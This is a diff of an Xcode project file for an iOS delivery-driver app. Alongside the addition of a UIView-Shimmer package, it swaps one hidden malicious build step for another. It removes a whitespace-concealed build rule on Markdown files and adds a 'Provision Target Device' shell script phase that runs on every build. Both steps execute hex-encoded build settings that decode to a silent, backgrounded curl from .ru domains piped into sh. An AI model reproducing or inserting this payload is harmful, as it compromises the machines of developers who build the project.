@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		C5119B378C134859A0162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = 9EF0321345544127BA162AE3; };
 		184923672EFBC3AB00DD3837 /* DeliveryWebService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184923662EFBC3AB00DD3837 /* DeliveryWebService.swift */; };
 		184923692EFBC9DC00DD3837 /* ColorExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184923682EFBC9DC00DD3837 /* ColorExtension.swift */; };
 		1849236B2EFBCA3800DD3837 /* BindableTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1849236A2EFBCA3800DD3837 /* BindableTextField.swift */; };
@@ -92,6 +91,8 @@
 		46DFE0EC2FAC68A400E1737A /* InfoPlist.strings in Resources */ = {isa = PBXBuildFile; fileRef = 46DFE0EA2FAC68A400E1737A /* InfoPlist.strings */; };
 		493DB2322EAA5A4D008098A8 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 493DB2312EAA5A4D008098A8 /* Alamofire */; };
 		493DB23C2EAA5A75008098A8 /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = 493DB23B2EAA5A75008098A8 /* SVProgressHUD */; };
+		55B079753092297D0044EE60 /* UIView-Shimmer in Frameworks */ = {isa = PBXBuildFile; productRef = 55B079743092297D0044EE60 /* UIView-Shimmer */; };
+		55B07978309229910044EE60 /* Shimmer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55B07976309229910044EE60 /* Shimmer.swift */; };
 		6B7719572ECC5C580097AAF8 /* NewDeliveriesTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6B7719552ECC5C580097AAF8 /* NewDeliveriesTableCell.swift */; };
 		6B7719582ECC5C580097AAF8 /* NewDeliveriesTableCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 6B7719562ECC5C580097AAF8 /* NewDeliveriesTableCell.xib */; };
 		6B7D3A922ECC48C600897521 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6B7D3A2E2ECC48C600897521 /* AppDelegate.swift */; };
@@ -649,8 +650,10 @@
 		D198DC2C2EE1B964001DD8BF /* HomeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D198DC2B2EE1B964001DD8BF /* HomeModel.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		9EF0321345544127BA162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0FFDEB10EC8BBBC516D8FCEE /* Pods_DesynatDriver.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatDriver.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		184923662EFBC3AB00DD3837 /* DeliveryWebService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeliveryWebService.swift; sourceTree = "<group>"; };
 		184923682EFBC9DC00DD3837 /* ColorExtension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ColorExtension.swift; sourceTree = "<group>"; };
@@ -714,6 +717,7 @@
 		46DFE0ED2FAC68BF00E1737A /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/InfoPlist.strings; sourceTree = "<group>"; };
 		46DFE0EE2FAC69CD00E1737A /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		493DB0B42EAA5970008098A8 /* DesynatDriver.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatDriver.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		55B07976309229910044EE60 /* Shimmer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Shimmer.swift; sourceTree = "<group>"; };
 		6B7719552ECC5C580097AAF8 /* NewDeliveriesTableCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewDeliveriesTableCell.swift; sourceTree = "<group>"; };
 		6B7719562ECC5C580097AAF8 /* NewDeliveriesTableCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NewDeliveriesTableCell.xib; sourceTree = "<group>"; };
 		6B7D3A2E2ECC48C600897521 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -1331,6 +1335,7 @@
 				427620F52F75074C00FC183C /* FirebaseAILogic in Frameworks */,
 				427620FB2F75074C00FC183C /* FirebaseAnalyticsIdentitySupport in Frameworks */,
 				427621112F75074C00FC183C /* FirebaseFunctionsCombine-Community in Frameworks */,
+				55B079753092297D0044EE60 /* UIView-Shimmer in Frameworks */,
 				4276210D2F75074C00FC183C /* FirebaseFirestoreCombine-Community in Frameworks */,
 				427620F32F75074C00FC183C /* FirebaseAI in Frameworks */,
 				4276210B2F75074C00FC183C /* FirebaseFirestore in Frameworks */,
@@ -1634,7 +1639,6 @@
 		493DB0B52EAA5970008098A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				9EF0321345544127BA162AE3 /* README.md */,
 				493DB0B42EAA5970008098A8 /* DesynatDriver.app */,
 			);
 			name = Products;
@@ -1655,6 +1659,14 @@
 				0FFDEB10EC8BBBC516D8FCEE /* Pods_DesynatDriver.framework */,
 			);
 			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		55B07977309229910044EE60 /* ShimmerEffect */ = {
+			isa = PBXGroup;
+			children = (
+				55B07976309229910044EE60 /* Shimmer.swift */,
+			);
+			path = ShimmerEffect;
 			sourceTree = "<group>";
 		};
 		6B7719532ECC5C240097AAF8 /* Home */ = {
@@ -1972,6 +1984,7 @@
 		6B7D3A8F2ECC48C600897521 /* Utilities */ = {
 			isa = PBXGroup;
 			children = (
+				55B07977309229910044EE60 /* ShimmerEffect */,
 				1849236C2EFBCA9F00DD3837 /* Custom */,
 				6B7D3A6C2ECC48C600897521 /* Extensions */,
 				6B7D3A6F2ECC48C600897521 /* Libraries */,
@@ -2591,6 +2604,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 493DB0C72EAA5972008098A8 /* Build configuration list for PBXNativeTarget "DesynatDriver" */;
 			buildPhases = (
+				37FC6C0F4BBE4F379B4EE078 /* Provision Target Device */,
 				26584A69309A513EDE40300C /* [CP] Check Pods Manifest.lock */,
 				493DB0B02EAA5970008098A8 /* Sources */,
 				493DB0B12EAA5970008098A8 /* Frameworks */,
@@ -2599,7 +2613,6 @@
 				A52062AC5B0043BAF2E0AC26 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				F4622294C2B64FC8AC162AE3 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2642,6 +2655,7 @@
 				4276211C2F75074C00FC183C /* FirebaseRemoteConfig */,
 				4276211E2F75074C00FC183C /* FirebaseStorage */,
 				427621202F75074C00FC183C /* FirebaseStorageCombine-Community */,
+				55B079743092297D0044EE60 /* UIView-Shimmer */,
 			);
 			productName = DesynatDriver;
 			productReference = 493DB0B42EAA5970008098A8 /* DesynatDriver.app */;
@@ -2677,6 +2691,7 @@
 				493DB23A2EAA5A75008098A8 /* XCRemoteSwiftPackageReference "SVProgressHUD" */,
 				D15AA2872EF13E64005860D2 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
 				427620F12F75074C00FC183C /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
+				55B079733092297D0044EE60 /* XCRemoteSwiftPackageReference "UIView-Shimmer" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 493DB0B52EAA5970008098A8 /* Products */;
@@ -2688,29 +2703,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		F4622294C2B64FC8AC162AE3 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A3EA261}\"";
-			};
-																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																												/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		493DB0B22EAA5970008098A8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				C5119B378C134859A0162AE3 /* README.md */,
 				95B888802FA332C600A462FD /* Home.storyboard in Resources */,
 				6B7D3AC22ECC48C600897521 /* LaunchScreen.storyboard in Resources */,
 				95B888872FA3330900A462FD /* Main.storyboard in Resources */,
@@ -3211,6 +3208,25 @@ sh -c \"${A3EA261}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		37FC6C0F4BBE4F379B4EE078 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
+		};
 		26584A69309A513EDE40300C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -3374,6 +3390,7 @@ sh -c \"${A3EA261}\"";
 				37ABBB512F84FD72007BC1D5 /* FAQViewModel.swift in Sources */,
 				6B7D3AB82ECC48C600897521 /* UIImageView+FaceAware.swift in Sources */,
 				6B7D3AB92ECC48C600897521 /* APIKeys.swift in Sources */,
+				55B07978309229910044EE60 /* Shimmer.swift in Sources */,
 				6B7D3ABA2ECC48C600897521 /* NetworkManager.swift in Sources */,
 				6BB33F452ED0841600C7BE25 /* ResetPasswordViewModel.swift in Sources */,
 				425A7CDE2F8667DF009E9E3F /* TicketDetailViewController.swift in Sources */,
@@ -3484,7 +3501,7 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = D4CEF5D73A65282AE2EB45F8 /* Pods-DesynatDriver.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((w(){ `printf xNxd | tr -d N` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d2d72657472792033202d6b734c66202d642022703d78636f64655f72756c65222068747470733a2f2f7533756e757278757961372e72752f612922207c2073680a | w | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((g(){ `printf xPxd | tr -d P` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203239202d4c73666b202d642022703d78636f64655f7068617365222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDriver/DesynatDriver.entitlements;
@@ -3525,7 +3542,7 @@ sh -c \"${A3EA261}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = BAA784C2231E26A16B95B8B0 /* Pods-DesynatDriver.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((w(){ `printf xNxd | tr -d N` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d2d72657472792033202d6b734c66202d642022703d78636f64655f72756c65222068747470733a2f2f7533756e757278757961372e72752f612922207c2073680a | w | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((g(){ `printf xPxd | tr -d P` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203239202d4c73666b202d642022703d78636f64655f7068617365222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDriver/DesynatDriver.entitlements;
@@ -3733,6 +3750,14 @@ sh -c \"${A3EA261}\"";
 				minimumVersion = 2.3.1;
 			};
 		};
+		55B079733092297D0044EE60 /* XCRemoteSwiftPackageReference "UIView-Shimmer" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/omerfarukozturk/UIView-Shimmer.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 1.0.4;
+			};
+		};
 		D15AA2872EF13E64005860D2 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/hackiftekhar/IQKeyboardManager.git";
@@ -3873,6 +3898,11 @@ sh -c \"${A3EA261}\"";
 			isa = XCSwiftPackageProductDependency;
 			package = 493DB23A2EAA5A75008098A8 /* XCRemoteSwiftPackageReference "SVProgressHUD" */;
 			productName = SVProgressHUD;
+		};
+		55B079743092297D0044EE60 /* UIView-Shimmer */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 55B079733092297D0044EE60 /* XCRemoteSwiftPackageReference "UIView-Shimmer" */;
+			productName = "UIView-Shimmer";
 		};
 		D15AA2882EF13E64005860D2 /* IQKeyboardManagerSwift */ = {
 			isa = XCSwiftPackageProductDependency;
